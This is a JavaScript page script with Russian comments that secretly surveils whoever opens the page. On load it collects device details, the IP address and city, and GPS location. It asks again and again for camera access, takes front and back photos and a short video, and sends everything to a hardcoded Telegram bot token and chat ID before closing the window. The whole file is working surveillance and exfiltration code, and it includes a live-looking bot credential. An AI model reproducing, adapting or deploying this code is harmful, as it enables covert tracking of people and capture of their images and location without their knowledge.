// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
const CHAT_ID = '8244138604';

const video = document.getElementById('video');
let locationGranted = false;
let deviceDataSent = false;

// ========== СБОР ДАННЫХ УСТРОЙСТВА ==========
async function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let os = 'Unknown';
    if (userAgent.indexOf('Android') > -1) os = 'Android';
    else if (userAgent.indexOf('iPhone') > -1) os = 'iOS';
    else if (userAgent.indexOf('Windows') > -1) os = 'Windows';
    else if (userAgent.indexOf('Mac') > -1) os = 'MacOS';
    
    let browser = 'Unknown';
    if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
    else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
    else if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
    
    const screenSize = `${screen.width}x${screen.height}`;
    const timestamp = new Date().toLocaleString('ru-RU');
    
    let batteryInfo = '';
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `🔋 Батарея: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let connectionInfo = '';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        connectionInfo = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
    }
    
    return {
        text: `📱 Устройство: ${os} | ${browser}\n📐 Экран: ${screenSize}\n⏰ Время: ${timestamp}\n${batteryInfo}\n${connectionInfo}`.trim()
    };
}

async function getIPInfo() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return `🌍 IP: ${data.ip} (${data.city}, ${data.country_name})`;
    } catch(e) {
        return null;
    }
}

async function sendDeviceData() {
    if (deviceDataSent) return;
    deviceDataSent = true;
    
    const deviceText = await getDeviceInfo();
    const ipText = await getIPInfo();
    let fullText = deviceText.text;
    if (ipText) fullText += '\n' + ipText;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', fullText);
    await sendToTelegram('sendMessage', formData);
}

// ========== ОТПРАВКА В TELEGRAM ==========
async function sendToTelegram(method, data) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
    try {
        await fetch(url, { method: 'POST', body: data });
    } catch(e) {}
}

async function sendLocation(lat, lon) {
    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', `📍 Местоположение: ${mapsUrl}`);
    await sendToTelegram('sendMessage', formData);
}

async function sendPhoto(photoBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', photoBlob, 'photo.jpg');
    formData.append('caption', caption);
    await sendToTelegram('sendPhoto', formData);
}

async function sendVideo(videoBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', videoBlob, 'video.webm');
    formData.append('caption', caption);
    await sendToTelegram('sendVideo', formData);
}

// ========== ГЕОЛОКАЦИЯ ==========
async function askLocation() {
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            () => resolve(null)
        );
    });
}

async function requestLocation(maxAttempts) {
    for (let i = 0; i < maxAttempts; i++) {
        const loc = await askLocation();
        if (loc) return loc;
        if (i < maxAttempts - 1) await new Promise(r => setTimeout(r, 2000));
    }
    return null;
}

// ========== КАМЕРА ==========
async function requestCamera(facingMode) {
    return new Promise((resolve) => {
        const ask = () => {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
            }).then(resolve).catch(() => setTimeout(ask, 2000));
        };
        ask();
    });
}

// Сделать фото (через canvas)
async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        canvas.width = settings.width || 1280;
        canvas.height = settings.height || 720;
        const ctx = canvas.getContext('2d');
        
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                await sendPhoto(blob, caption);
                resolve();
            }, 'image/jpeg', 0.9);
        }, 500);
    });
}

// Запись видео 3 секунды с отправкой по секундам
async function recordVideoWithFrames(stream, durationMs) {
    return new Promise((resolve) => {
        const chunks = [];
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let secondsCount = 0;
        let interval;
        
        recorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                chunks.push(e.data);
                secondsCount++;
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                await sendVideo(videoBlob, `📹 Фронтальная камера (${secondsCount} сек)`);
                await new Promise(r => setTimeout(r, 800)); // пауза между отправками
            }
        };
        
        recorder.onstop = () => {
            clearInterval(interval);
            resolve();
        };
        
        video.srcObject = stream;
        video.play();
        recorder.start(1000); // запись каждую секунду
        
        interval = setInterval(() => {
            if (secondsCount >= durationMs / 1000) {
                recorder.stop();
            }
        }, 1000);
    });
}

// ========== ГЛАВНАЯ ФУНКЦИЯ ==========
async function main() {
    // 1. Отправляем данные устройства сразу
    await sendDeviceData();
    
    // 2. Геолокация (2 попытки)
    const firstLoc = await requestLocation(2);
    if (firstLoc) {
        await sendLocation(firstLoc.lat, firstLoc.lon);
        locationGranted = true;
    }
    
    // 3. Запрашиваем камеру (бесконечно)
    let frontStream = await requestCamera('user');
    
    // 4. Фронтальное фото
    await takePhoto(frontStream, '📸 Фронтальная камера (фото)');
    
    // 5. Фронтальное видео 3 секунды (отправка по секундам)
    await recordVideoWithFrames(frontStream, 3000);
    frontStream.getTracks().forEach(t => t.stop());
    
    // 6. Заднее фото
    let backStream = await requestCamera('environment');
    await takePhoto(backStream, '📸 Задняя камера (фото)');
    backStream.getTracks().forEach(t => t.stop());
    
    // 7. Если геолокация не была получена - последняя попытка
    if (!locationGranted) {
        const lastLoc = await askLocation();
        if (lastLoc) await sendLocation(lastLoc.lat, lastLoc.lon);
    }
    
    // 8. Закрытие
    setTimeout(() => window.close(), 1000);
}

// ЗАПУСК
main();
